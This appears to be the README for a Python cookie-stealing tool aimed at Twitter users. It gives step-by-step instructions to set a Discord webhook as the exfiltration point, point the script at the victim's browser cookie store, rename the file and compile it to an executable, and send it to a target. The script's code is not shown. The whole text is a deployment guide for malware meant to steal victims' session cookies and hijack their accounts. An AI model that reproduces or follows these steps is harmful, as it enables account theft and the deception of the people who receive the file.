# HOW TO USE TWITTER STEALER:

    1 Begin by creating a Discord webhook.
    2 Next, locate and open the file named TwitterLogger.py.
    3 Navigate to line number 4 within the file and insert your Discord webhook between the specified strings.
    4 Now, whether this step is necessary depends on your target browser. If you're using a browser other than Firefox, proceed to line 6. Look for the variable named Browser_Cookie3 and change .firefox to .anybrowser, ensuring compatibility with your chosen browser.
    5 Once you've made the appropriate changes, save the file. You can then rename the file to anything you like and convert it into an executable (exe) format. Finally, you can send the executable file to someone who uses the browser you've specified and has a Twitter account.
